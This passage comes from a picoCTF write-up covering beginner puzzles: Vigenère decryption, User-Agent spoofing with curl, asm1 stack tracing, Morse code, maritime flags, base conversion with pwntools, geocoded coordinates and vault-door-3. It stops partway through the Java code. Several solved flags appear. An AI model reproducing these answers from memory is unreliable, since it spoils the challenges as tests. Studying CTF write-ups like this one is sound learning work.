            <span style="color:#6272a4">#if ord(ctext[i]) == 232:</span>
            <span style="color:#6272a4">#    print(ctext[i]*64)</span>
            plaintext <span style="color:#ff79c6">+=</span> ctext[i]
    <span style="color:#ff79c6">return</span> plaintext

<span style="color:#8be9fd;font-style:italic">print</span>(vigenere_decrypt(ctext, <span style="color:#f1fa8c">&#39;flag&#39;</span>))

<span style="color:#6272a4">#from pycipher import Vigenere</span>
<span style="color:#6272a4">#plaintext = Vigenere(&#39;FLAG&#39;).decipher(ctext)</span>
<span style="color:#6272a4">#print (plaintext.lower())</span>
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre tabindex="0"><code>python3 test.py
Zccltetyy bemnpgy:
It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_[..SNIP..]}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.
</code></pre><h2 id="picobrowser">picobrowser</h2>
<ol>
<li>click the Flag button</li>
<li>Read the message <code>You re not picobrowser! Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0 </code></li>
<li>We simply have to change the User-Agent on developer tools or with curl</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -sX GET https://jupiter.challenges.picoctf.org/problem/28921/flag -H <span style="color:#f1fa8c">&#34;User-Agent: picobrowser&#34;</span> |
grep <span style="color:#f1fa8c">&#34;picoCTF{&#34;</span> | cut -d<span style="color:#f1fa8c">&#39;&gt;&#39;</span> -f5 | cut -d<span style="color:#f1fa8c">&#39;&lt;&#39;</span> -f1
</code></pre></td></tr></table>
</div>
</div><h2 id="asm1">asm1</h2>
<p>This is how the stack looks like after the prolog:</p>
<pre><code>| old ebp   |
| ret       | &lt;-- ebp+4
| 0x8be     | &lt;-- ebp+8
</code></pre>
<p>Lets audit the program with <a href="https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm">this doc</a>
as a reference:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">asm1:</span>
        &lt;+0&gt;:   <span style="color:#50fa7b">push</span>   ebp                              <span style="color:#6272a4">; prolog ;
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">1</span>&gt;:   mov    ebp,esp                          <span style="color:#6272a4">; prolog ; ebp+8 = 0x8be
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">3</span>&gt;:   cmp    DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x71c</span>        <span style="color:#6272a4">; 0x8be &gt;  0x71c
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">10</span>&gt;:  jg     <span style="color:#bd93f9">0x512</span> &lt;asm1+<span style="color:#bd93f9">37</span>&gt;                  <span style="color:#6272a4">; jump as greater
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">12</span>&gt;:  cmp    DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x6cf</span>
        &lt;+19&gt;:  <span style="color:#50fa7b">jne</span>    <span style="color:#bd93f9">0x50a</span> &lt;asm1+<span style="color:#bd93f9">29</span>&gt;
        &lt;+21&gt;:  <span style="color:#50fa7b">mov</span>    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>]
        &lt;+24&gt;:  <span style="color:#50fa7b">add</span>    eax,<span style="color:#bd93f9">0x3</span>
        &lt;+27&gt;:  <span style="color:#50fa7b">jmp</span>    <span style="color:#bd93f9">0x529</span> &lt;asm1+<span style="color:#bd93f9">60</span>&gt;
        &lt;+29&gt;:  <span style="color:#50fa7b">mov</span>    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>]
        &lt;+32&gt;:  <span style="color:#50fa7b">sub</span>    eax,<span style="color:#bd93f9">0x3</span>
        &lt;+35&gt;:  <span style="color:#50fa7b">jmp</span>    <span style="color:#bd93f9">0x529</span> &lt;asm1+<span style="color:#bd93f9">60</span>&gt;
        &lt;+37&gt;:  <span style="color:#50fa7b">cmp</span>    DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x8be</span>        <span style="color:#6272a4">; 0x8be = 0x8be (dec 2238)
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">44</span>&gt;:  jne    <span style="color:#bd93f9">0x523</span> &lt;asm1+<span style="color:#bd93f9">54</span>&gt;                  <span style="color:#6272a4">; don&#39;t jump because equal
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">46</span>&gt;:  mov    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>]          <span style="color:#6272a4">; eax = 0x8be
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">49</span>&gt;:  sub    eax,<span style="color:#bd93f9">0x3</span>                          <span style="color:#6272a4">; eax = 0x8be - 0x3 = 0x8bb
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">52</span>&gt;:  jmp    <span style="color:#bd93f9">0x529</span> &lt;asm1+<span style="color:#bd93f9">60</span>&gt;
        &lt;+54&gt;:  <span style="color:#50fa7b">mov</span>    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>]
        &lt;+57&gt;:  <span style="color:#50fa7b">add</span>    eax,<span style="color:#bd93f9">0x3</span>
        &lt;+60&gt;:  <span style="color:#50fa7b">pop</span>    ebp                              <span style="color:#6272a4">; epilog ;
</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">61</span>&gt;:  ret                                     <span style="color:#6272a4">; epilog ; return eax = 0x8bb
</span></code></pre></td></tr></table>
</div>
</div><h2 id="tapping">Tapping</h2>
<pre tabindex="0"><code>.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. .---- ..--- -.... .---- ....- ...-- ---.. .---- ---.. .---- }&gt;&gt;
</code></pre><p>copy paste the above morse code in <a href="https://morsedecoder.com/">https://morsedecoder.com/</a> to get the flag</p>
<h2 id="flags">Flags</h2>
<p>This is a visual challenge where some images replaces letters, we can guess part of it:</p>
<pre><code>picoctf{f????????t?ff}
</code></pre>
<p>it is impossible to solve or guess, so there must be a meaning. It looks like Marine flags which can indeed be found in Wikipedia: <a href="https://en.wikipedia.org/wiki/International_maritime_signal_flags#Letter_flags_(with_ICS_meaning)">International Maritime Signal Flag</a></p>
<p>it translates into:</p>
<pre><code>picoctf{f1ag5and5tuff}
</code></pre>
<h2 id="based">Based</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python3</span>
<span style="color:#ff79c6">import</span> pwn
<span style="color:#ff79c6">import</span> re

host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;jupiter.challenges.picoctf.org&#39;</span>, <span style="color:#bd93f9">29956</span>
s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)

prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Input:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>decode()
code <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Please give the ([^a]*)as a word.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)
code <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(x,<span style="color:#bd93f9">2</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> code]
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(code))

prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Input:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>decode()
code <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Please give me the ([^a]*)as a word.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>strip()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)
code <span style="color:#ff79c6">=</span> [<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(x,<span style="color:#bd93f9">8</span>)) <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> code]
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(code))

prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;Input:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)<span style="color:#ff79c6">.</span>decode()
<span style="color:#8be9fd;font-style:italic">print</span>(prompt)

code <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Please give me the ([^a]*)as a word.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>strip()
bytes_array <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(code)
code <span style="color:#ff79c6">=</span> bytes_array<span style="color:#ff79c6">.</span>decode()
s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(code))

prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvall()<span style="color:#ff79c6">.</span>ecode()
flag <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Flag: (picoCTF{.*})&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(flag)
</code></pre></td></tr></table>
</div>
</div><h2 id="mr-worldwide">Mr-Worldwide</h2>
<p>Those are obvious geographic coordinates</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">import</span> requests<span style="color:#ff79c6">,</span> re
<span style="color:#ff79c6">import</span> time

flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}&#34;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_letter_from_coordinate</span>(match):
    lat <span style="color:#ff79c6">=</span> match<span style="color:#ff79c6">.</span>group(<span style="color:#bd93f9">1</span>)
    long <span style="color:#ff79c6">=</span> match<span style="color:#ff79c6">.</span>group(<span style="color:#bd93f9">2</span>)

    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:                         <span style="color:#6272a4"># Because we are being throttled</span>
        <span style="color:#ff79c6">try</span>:
            r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;https://geocode.xyz/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">,</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">?json=1&#34;</span><span style="color:#ff79c6">.</span>format(lat, long))
            j <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>json()
            <span style="color:#8be9fd;font-style:italic">print</span>(j)
            <span style="color:#ff79c6">if</span> j<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#34;success&#34;</span>) <span style="color:#ff79c6">and</span> <span style="color:#ff79c6">not</span> j[<span style="color:#f1fa8c">&#34;success&#34;</span>] <span style="color:#ff79c6">and</span> j[<span style="color:#f1fa8c">&#34;error&#34;</span>][<span style="color:#f1fa8c">&#34;code&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;006&#34;</span>:  <span style="color:#6272a4"># We are being throttled</span>
                <span style="color:#ff79c6">raise</span> Exception(<span style="color:#f1fa8c">&#34;Throttled by goecode.xyz&#34;</span>)
            <span style="color:#ff79c6">return</span> j[<span style="color:#f1fa8c">&#34;geocode&#34;</span>][<span style="color:#bd93f9">0</span>]
        <span style="color:#ff79c6">except</span>:
            time<span style="color:#ff79c6">.</span>sleep(<span style="color:#bd93f9">10</span>)              <span style="color:#6272a4"># Due to throttling</span>


<span style="color:#8be9fd;font-style:italic">print</span>(re<span style="color:#ff79c6">.</span>sub(<span style="color:#f1fa8c">r</span><span style="color:#f1fa8c">&#39;\(([\d\.-]+), ([\d\.-]+)\)&#39;</span>, get_letter_from_coordinate, flag))
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>picoCTF{KODIAK_ALANKA}
</code></pre>
<p>When searching the Internet for <code>KODIAK_ALANKA</code>, auto-correction points us to <code>Kodiak, Alaska</code>, therefore we can correct our flag:</p>
<pre><code>picoCTF{KODIAK_ALASKA}
</code></pre>
<h2 id="plumbing">Plumbing</h2>
<pre><code>nc jupiter.challenges.picoctf.org 4427 | grep pico
</code></pre>
<h2 id="vault-door-3">vault-door-3</h2>
<pre><code>curl -sL https://jupiter.challenges.picoctf.org/static/a4018cec1446761cb2e8cce05db925fa/VaultDoor3.java | tail -22
</code></pre>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">boolean</span> <span style="color:#50fa7b">checkPassword</span><span style="color:#ff79c6">(</span>String password<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">length</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">!=</span> 32<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
    <span style="color:#ff79c6">}</span>
    <span style="color:#8be9fd">char</span><span style="color:#ff79c6">[]</span> buffer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">char</span><span style="color:#ff79c6">[</span>32<span style="color:#ff79c6">];</span>
    <span style="color:#8be9fd">int</span> i<span style="color:#ff79c6">;</span>
    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>i<span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">&lt;</span>8<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
        buffer<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">charAt</span><span style="color:#ff79c6">(</span>i<span style="color:#ff79c6">);</span>
    <span style="color:#ff79c6">}</span>
    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(;</span> i<span style="color:#ff79c6">&lt;</span>16<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">++)</span> <span style="color:#ff79c6">{</span>
        buffer<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">charAt</span><span style="color:#ff79c6">(</span>23<span style="color:#ff79c6">-</span>i<span style="color:#ff79c6">);</span>
    <span style="color:#ff79c6">}</span>
    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(;</span> i<span style="color:#ff79c6">&lt;</span>32<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">+=</span>2<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
        buffer<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">charAt</span><span style="color:#ff79c6">(</span>46<span style="color:#ff79c6">-</span>i<span style="color:#ff79c6">);</span>
    <span style="color:#ff79c6">}</span>
    <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">(</span>i<span style="color:#ff79c6">=</span>31<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">&gt;=</span>17<span style="color:#ff79c6">;</span> i<span style="color:#ff79c6">-=</span>2<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
        buffer<span style="color:#ff79c6">[</span>i<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">=</span> password<span style="color:#ff79c6">.</span><span style="color:#50fa7b">charAt</span><span style="color:#ff79c6">(</span>i<span style="color:#ff79c6">);</span>
    <span style="color:#ff79c6">}</span>
    String s <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">(</span>buffer<span style="color:#ff79c6">);</span>
